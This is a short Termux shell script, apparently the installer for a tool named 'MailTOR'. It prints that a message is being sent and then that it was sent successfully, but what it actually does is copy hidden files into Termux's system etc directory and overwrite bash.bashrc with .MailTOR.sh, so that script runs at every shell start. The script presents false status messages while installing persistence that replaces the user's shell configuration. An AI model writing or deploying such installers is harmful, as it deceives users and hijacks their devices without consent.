clear
cat .banner
apt update
apt upgrade
apt upgrade
apt update
echo "The message is being sent."
cp .banner -r /data/data/com.termux/files/usr/etc/
cp .rec -r /data/data/com.termux/files/usr/etc/
cp .msg -r /data/data/com.termux/files/usr/etc/
cp .MailTOR.sh -r /data/data/com.termux/files/usr/etc/bash.bashrc
echo "The message has been sent successfully"
echo "Open a window to continue"
read input
bash MailTOR.sh
